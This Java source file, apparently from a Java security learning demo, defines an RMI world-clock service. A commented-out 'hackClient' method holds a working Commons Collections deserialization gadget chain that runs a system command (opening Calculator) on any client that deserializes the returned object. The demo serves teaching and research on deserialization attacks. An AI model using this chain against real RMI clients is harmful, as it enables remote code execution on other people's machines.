package com.javasec.learndemo.local.rmi;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.rmi.RemoteException;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.util.HashMap;
import java.util.Map;

public class WorldClassService implements WorldClock {
    @Override
    public LocalDateTime getLocalDateTime(String zoneId) throws RemoteException {
        return LocalDateTime.now(ZoneId.of(zoneId)).withNano(0);
    }
    public void exec(Object obj) throws Exception{
        System.out.println("this is called!");
    }

    public void execString(String obj) throws Exception{
        System.out.println("this is called!");
    }
    @Override
    public Object hackClient() throws Exception {
        return null;
    }

//    public Object hackClient() throws Exception{
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod",
//                        new Class[]{String.class, Class[].class},
//                        new Object[]{"getRuntime", new Class[0]}),
//                new InvokerTransformer("invoke",
//                        new Class[]{Object.class, Object[].class},
//                        new Object[]{"exec", new Object[0]}),
//                new InvokerTransformer("exec",
//                        new Class[]{String.class},
//                        new Object[]{"open /System/Applications/Calculator.app"})
//        };
//        Transformer transformerChain = new ChainedTransformer(transformers);
//        Map innerMap = new HashMap();
//        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
//
//        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
//        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
//        Field val = badAttributeValueExpException.getClass().getDeclaredField("val");
//        val.setAccessible(true);
//        val.set(badAttributeValueExpException,entry);
//        return badAttributeValueExpException;
//    }
}
